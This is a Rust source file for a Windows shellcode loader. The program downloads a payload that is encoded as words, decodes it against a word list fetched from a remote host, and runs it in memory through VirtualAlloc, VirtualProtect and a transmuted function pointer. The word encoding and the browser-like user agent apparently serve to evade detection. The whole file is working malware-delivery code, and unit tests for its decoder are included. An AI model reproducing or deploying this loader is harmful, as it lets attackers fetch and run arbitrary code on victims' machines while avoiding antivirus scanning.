use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::error::Error;
use std::mem;
use std::ptr;
use std::time::Duration;
use log::{debug, error, info, warn, LevelFilter};
use reqwest::blocking;

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
};

const DICTIONARY_URL: &str = "https://example.com/dictionary.txt";
const PAYLOAD_URL: &str = "https://example.com/load.txt";
const DICTIONARY_PATH: &str = "dictionary.txt";
const MAX_RETRIES: u8 = 3;

/// Initialize the logger with appropriate settings
fn setup_logging() -> Result<(), Box<dyn Error>> {
    env_logger::Builder::new()
        .filter_level(LevelFilter::Info)
        .format_timestamp_secs()
        .format_module_path(false)
        .init();
    
    debug!("Logging initialized");
    Ok(())
}

/// Ensure HTTPS URLs for security
fn validate_url(url: &str) -> Result<(), Box<dyn Error>> {
    if !url.starts_with("https://") {
        return Err(format!("Non-HTTPS URL detected: {}", url).into());
    }
    Ok(())
}

/// Download content with retry mechanism
fn download_with_retries(url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
    info!("Downloading from: {}", url);
    
    let client = blocking::ClientBuilder::new()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .timeout(Duration::from_secs(30))
        .build()?;
    
    for attempt in 1..=retries {
        match client.get(url).send() {
            Ok(response) => {
                if response.status().is_success() {
                    match response.text() {
                        Ok(text) if !text.is_empty() => {
                            debug!("Successfully downloaded {} bytes", text.len());
                            return Ok(text);
                        },
                        Ok(_) => warn!("Received empty response from {}", url),
                        Err(e) => warn!("Failed to extract text: {}", e),
                    }
                } else {
                    warn!("Received status code {}: {}", response.status(), url);
                }
            },
            Err(e) => warn!("Request error on attempt {}: {}", attempt, e),
        }
        
        if attempt < retries {
            let backoff = Duration::from_secs(2u64.pow(attempt as u32));
            debug!("Retrying in {:?}", backoff);
            std::thread::sleep(backoff);
        }
    }
    
    Err(format!("Failed to retrieve content after {} attempts", retries).into())
}

/// Cache dictionary or load from existing cache
fn cache_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
    let path = Path::new(DICTIONARY_PATH);
    
    // Try to load from cache first
    if path.exists() {
        info!("Loading dictionary from cache");
        let mut content = String::new();
        File::open(path)?
            .read_to_string(&mut content)?;
            
        let words = content
            .lines()
            .map(String::from)
            .collect::<Vec<String>>();
            
        info!("Loaded {} words from cache", words.len());
        
        if words.is_empty() {
            return Err("Dictionary is empty".into());
        }
        
        return Ok(words);
    }
    
    // Download and cache
    info!("Downloading dictionary from {}", DICTIONARY_URL);
    let text = download_with_retries(DICTIONARY_URL, MAX_RETRIES)?;
    
    // Create cache file
    info!("Caching dictionary to {}", DICTIONARY_PATH);
    File::create(path)?
        .write_all(text.as_bytes())?;
    
    let words = text
        .lines()
        .map(String::from)
        .collect::<Vec<String>>();
        
    info!("Cached {} words", words.len());
    
    if words.is_empty() {
        return Err("Dictionary is empty".into());
    }
    
    Ok(words)
}

/// Download the encoded payload
fn download_load() -> Result<Vec<String>, Box<dyn Error>> {
    info!("Downloading payload from {}", PAYLOAD_URL);
    let text = download_with_retries(PAYLOAD_URL, MAX_RETRIES)?;
    
    let tokens = text
        .split_whitespace()
        .map(String::from)
        .collect::<Vec<String>>();
        
    info!("Downloaded {} encoded tokens", tokens.len());
    
    if tokens.is_empty() {
        return Err("Payload is empty".into());
    }
    
    Ok(tokens)
}

/// Decode the payload using the dictionary
fn decode_payload(tokens: &[String], dict: &[String]) -> Result<Vec<u8>, Box<dyn Error>> {
    info!("Decoding payload with {} words using {} dictionary entries", tokens.len(), dict.len());
    
    let mut output = Vec::with_capacity(tokens.len());
    
    for (i, token) in tokens.iter().enumerate() {
        if let Some(index) = dict.iter().position(|word| word == token) {
            output.push(index as u8);
        } else {
            // Try parsing as direct byte value
            match token.parse::<u8>() {
                Ok(value) => output.push(value),
                Err(_) => warn!("Token at position {} not found in dictionary: {}", i, token),
            }
        }
    }
    
    info!("Decoded {} bytes of shellcode", output.len());
    
    if output.is_empty() {
        return Err("Decoded payload is empty".into());
    }
    
    Ok(output)
}

/// Execute shellcode using standard Windows APIs
fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    info!("Executing {} bytes of shellcode", shellcode.len());
    
    unsafe {
        // Allocate memory for shellcode with VirtualAlloc
        let size = shellcode.len();
        debug!("Allocating {} bytes of memory", size);
        
        let base_addr = VirtualAlloc(
            ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        
        if base_addr.is_null() {
            return Err("Memory allocation failed".into());
        }
        
        // Copy shellcode to allocated memory
        debug!("Copying shellcode to allocated memory at {:p}", base_addr);
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base_addr as *mut u8, size);
        
        // Change memory protection to executable
        let mut old_protect = 0;
        debug!("Changing memory protection to executable");
        
        if VirtualProtect(base_addr, size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            return Err("Failed to change memory protection".into());
        }
        
        // Execute the shellcode
        info!("Executing shellcode at address {:p}", base_addr);
        let entry: extern "system" fn() = mem::transmute(base_addr);
        entry();
        
        info!("Shellcode execution completed");
    }
    
    Ok(())
}

/// Perform pre-execution security checks
fn security_checks() -> Result<(), Box<dyn Error>> {
    debug!("Performing security checks");
    
    // Validate URLs (ensure HTTPS)
    validate_url(DICTIONARY_URL)?;
    validate_url(PAYLOAD_URL)?;
    
    // Additional security checks could be added here
    
    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    // Initialize logging
    setup_logging()?;
    
    info!("Application starting");
    
    // Run security checks
    let result = security_checks();
    if let Err(e) = &result {
        error!("Security checks failed: {}", e);
    }
    result?;
    
    // Get dictionary (from cache or download)
    let dict = match cache_dictionary() {
        Ok(d) => d,
        Err(e) => {
            error!("Dictionary retrieval failed: {}", e);
            return Err(e);
        }
    };
    
    // Download encoded payload
    let tokens = match download_load() {
        Ok(t) => t,
        Err(e) => {
            error!("Payload retrieval failed: {}", e);
            return Err(e);
        }
    };
    
    // Decode the payload
    let payload = match decode_payload(&tokens, &dict) {
        Ok(p) => p,
        Err(e) => {
            error!("Payload decoding failed: {}", e);
            return Err(e);
        }
    };
    
    // Execute the shellcode
    if let Err(e) = execute_shellcode(&payload) {
        error!("Shellcode execution failed: {}", e);
        return Err(e);
    }
    
    info!("Application completed successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_decode_payload() {
        let dict = vec!["zero".to_string(), "one".to_string(), "two".to_string()];
        let tokens = vec!["one".to_string(), "two".to_string(), "zero".to_string()];
        
        let result = decode_payload(&tokens, &dict).unwrap();
        assert_eq!(result, vec![1, 2, 0]);
    }
    
    #[test]
    fn test_decode_with_numeric_fallback() {
        let dict = vec!["zero".to_string(), "one".to_string()];
        let tokens = vec!["one".to_string(), "255".to_string(), "zero".to_string()];
        
        let result = decode_payload(&tokens, &dict).unwrap();
        assert_eq!(result, vec![1, 255, 0]);
    }
    
    #[test]
    fn test_validate_url() {
        assert!(validate_url("https://example.com").is_ok());
        assert!(validate_url("http://example.com").is_err());
    }
}
